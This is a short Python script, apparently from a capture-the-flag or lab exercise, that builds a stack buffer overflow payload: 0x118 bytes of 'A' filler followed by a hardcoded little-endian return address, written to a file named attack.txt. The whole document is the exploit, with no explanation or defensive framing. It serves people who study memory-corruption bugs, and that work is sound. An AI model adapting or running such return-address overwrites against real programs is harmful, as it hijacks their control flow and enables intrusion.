offset = 0x118
ret_addr = 0x555555555229

payload = b"A" * offset
payload += ret_addr.to_bytes(8, 'little')

with open("attack.txt", "wb") as f:
    f.write(payload)